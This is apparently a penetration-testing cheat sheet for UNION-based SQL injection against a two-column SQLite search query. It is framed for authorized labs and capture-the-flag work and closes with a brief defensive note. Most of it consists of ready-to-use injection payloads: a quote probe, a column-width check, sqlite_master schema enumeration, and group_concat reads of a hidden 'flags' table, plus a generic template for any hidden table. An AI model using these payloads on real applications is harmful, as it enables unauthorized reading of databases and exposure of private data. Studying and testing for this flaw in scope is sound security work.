# UNION Two-Column Hidden-Table Read

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- a search or lookup parameter is injected into a quoted SQL string
- the application renders result rows directly to the user
- `UNION` is accepted
- the base query returns exactly 2 visible columns

## Requirements

- You have confirmed string-literal injection with a quote probe.
- You have confirmed the `UNION` column count is 2.
- The database user can read the target hidden table.

## Baseline

```text
'
```

Look for:

```text
unrecognized token
syntax error
near "'"
```

## Width Check

```text
' UNION SELECT 1,2--
```

If this injects a visible row, you have the right shape.

## SQLite Enumeration

List schema rows:

```sql
' UNION SELECT sql, 'x' FROM sqlite_master WHERE type='table'--
```

List table names:

```sql
' UNION SELECT group_concat(name), 'x' FROM sqlite_master WHERE type='table'--
```

## Hidden Table Read

Single value:

```sql
' UNION SELECT value, 'x' FROM flags--
```

Concatenated values:

```sql
' UNION SELECT group_concat(value), 'x' FROM flags--
```

## Generic Shape

```sql
' UNION SELECT [interesting_column], 'x' FROM [hidden_table]--
```

## Why It Works

The base query and the injected query return the same number of columns, so SQLite merges them into one result set. The application then renders the injected row as if it were a normal record.

## Why It Fails

- Wrong number of columns.
- Incompatible types in stricter DB contexts.
- Input is parameterized or escaped.
- The target table is not readable by the active DB user.
- Comments are filtered and trailing SQL remains syntactically invalid.

## Common Mistakes

- Jumping to 3-column `UNION` guesses without checking width.
- Forgetting to enumerate schema first.
- Using reusable payload files to store live flags or target-specific secrets.
- Assuming the hidden table name without evidence from metadata.

## Defensive Note

Any search query that concatenates raw input into SQL and shares DB privileges with hidden tables is one `UNION` away from data disclosure.
